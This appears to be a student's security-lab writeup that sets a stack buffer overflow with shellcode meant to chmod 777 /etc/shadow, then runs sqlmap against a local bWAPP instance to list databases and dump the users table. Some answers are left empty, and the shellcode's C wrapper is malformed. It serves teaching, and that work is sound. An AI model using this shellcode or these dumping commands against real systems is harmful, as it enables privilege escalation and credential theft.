![image](https://github.com/user-attachments/assets/41d8b554-4694-4717-b0b4-6840645aa1a0)# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

Description text (optional)


``` 
    code block (optional)
```

output screenshot (optional)

**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

Step 1: Install SQL map from this link : https://github.com/sqlmapproject/sqlmap.git

Step 2: Install bWAPP by following the tutorial in this link: https://github.com/quang-ute/Security-labs/tree/main/Web-security/Vulnerable%20Web%20App

Step 3: Login and choose the bug:

![image](https://github.com/user-attachments/assets/e708c4d6-b51c-4125-8683-c5fa7692435c)

Step 4: Select movie and copy the url ( note that: delete query action ) : http://localhost:8025/sqli_2.php?movie=1

![image](https://github.com/user-attachments/assets/84ffb76e-4217-4558-9090-b022dcbdebbf)

![image](https://github.com/user-attachments/assets/3b315eed-2f9b-42ab-a9b7-0f0f7011b964)


Step 5: Open Developer Tool and get cookie value in tab Application

![image](https://github.com/user-attachments/assets/190e9138-8366-40a9-b277-d06cf45cb92d)


Step 6: cd to folder sqlmap and run the code : python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" --dbs --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"


Step 7: Always type y and the terminal show all the databases

![image](https://github.com/user-attachments/assets/70c022fe-a3b0-4e75-8120-c3426bba3bfe)


**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:	

Step 1: Run this code to see all the tables of bWAPP database: sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP --tables --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"

![image](https://github.com/user-attachments/assets/0280a6a8-e771-4df8-b6c4-aa1ece23bbae)

Step 2: Run this code see all the column of users table: python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --columns --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"

![image](https://github.com/user-attachments/assets/972a52b4-b243-4366-a157-ad269d6a5530)

Step 3: Run this code to see all records in table user : python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --dump --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"


![image](https://github.com/user-attachments/assets/3d8e083d-96d6-4559-9093-5d929c14d623)



**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
